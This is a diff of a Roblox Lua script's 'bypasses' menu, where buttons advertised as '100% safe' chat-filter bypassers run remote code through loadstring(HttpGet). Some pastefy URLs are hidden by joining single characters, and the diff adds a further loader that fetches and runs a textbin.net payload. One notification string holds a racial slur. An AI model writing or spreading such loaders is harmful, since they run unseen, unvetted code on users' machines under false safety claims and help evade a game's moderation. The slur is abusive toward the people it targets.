@@ -1206,24 +1206,25 @@ end)
 --[bypasses]--
 FunSection:NewLabel("Xhat Bypass")
 FunSection:NewButton("Explikit Bypasser🔞(100% safe)", "has an antilogger so u will not be banned", function()
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-    Library.DefaultColor = Color3.fromRGB(50,205,50)
+  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+  Library.DefaultColor = Color3.fromRGB(50,205,50)
 
-    Library:Notification({
-    Text = "Loading Explikit Bypasser...(10s)",
-    Duration = 3
-    })
-    
-    --explikitbypasser🔞+
-    loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'a'..'B'..'i'..'X'..'w'..'6'..'R'..'C'..'/'..'r'..'a'..'w'), true))()
+  Library:Notification({
+  Text = "Loading Explikit Bypasser...",
+  Duration = 3.2
+  })
 
-    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-    Library.DefaultColor = Color3.fromRGB(50,205,50)
+  --explikitbypasser🔞+
+  loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'a'..'B'..'i'..'X'..'w'..'6'..'R'..'C'..'/'..'r'..'a'..'w'), true))()
 
-    Library:Notification({
-    Text = "loaded! have fun nigger",
-    Duration = 3
-    })
+  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+  Library.DefaultColor = Color3.fromRGB(50,205,50)
+
+  Library:Notification({
+  Text = "loaded! have fun nigger",
+  Duration = 3
+  })--hookbelowforexplikitbypasser
+loadstring(game:HttpGet("https://textbin.net/raw/uhnqzkvywq",true))()
 end)
 FunSection:NewButton("NGA Bypasser(100% safe)", "has an antilogger so u will not be banned", function()--ngabypasser
 loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'J'..'h'..'8'..'r'..'s'..'l'..'a'..'5'..'/'..'r'..'a'..'w'), true))()
